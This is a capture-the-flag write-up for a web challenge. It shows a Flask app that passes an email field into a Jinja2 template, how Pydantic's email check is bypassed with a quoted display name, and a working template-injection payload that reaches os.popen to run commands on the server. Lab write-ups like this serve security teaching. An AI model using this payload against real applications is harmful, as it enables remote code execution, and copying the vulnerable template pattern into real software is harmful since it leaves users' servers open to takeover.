# Jinja — Writeup

**CTF:** 0xFun CTF 2026
**Category:** Web
**Flag:** `0xfun{Z3r0_7ru57_R3nd3r}`

---

## Description

> We render, you use it. Give us emails of your customers to send them a welcome email.

Flask application that receives an email and generates a welcome message.

## Analysis

### Source code (app.py)

```python
class EmailModel(BaseModel):
    email: EmailStr

@app.route('/render', methods=['POST'])
def render_email():
    email = request.form.get('email')
    try:
        email_obj = EmailModel(email=email)
        return Template(email_template % (email)).render()  # SSTI!
    except ValidationError:
        return render_template('mail.html', error="Invalid email format.")
```

The vulnerability is clear: the user's email is injected directly into `jinja2.Template()` via `%s` — **Server-Side Template Injection (SSTI)**.

### Validation bypass

Pydantic `EmailStr` validates the format, but accepts the RFC 5322 format with "display name":

```
"(Display Name)" <user@domain.com>
```

This allows injecting arbitrary characters (including `{{`, `}}`, `(`, `)`) within the quotes.

### Exploit

```
"({{cycler.__init__.__globals__.os.popen("/getflag").read()}})" <t@g.com>
```

1. `EmailStr` accepts the format since it's a valid email with display name
2. The full string is interpreted as a Jinja2 template
3. `cycler.__init__.__globals__.os.popen()` gives RCE
4. `/getflag` prints the flag

## Solution

```bash
python3 solve.py http://chall.0xfun.org:44355
# 0xfun{Z3r0_7ru57_R3nd3r}
```

## Flag

```
0xfun{Z3r0_7ru57_R3nd3r}
```

## Reference

Technique based on [HeroCTF 2024 - Jinjatic](https://fayred.fr/en/writeups/heroctf-2024-jinjatic/).
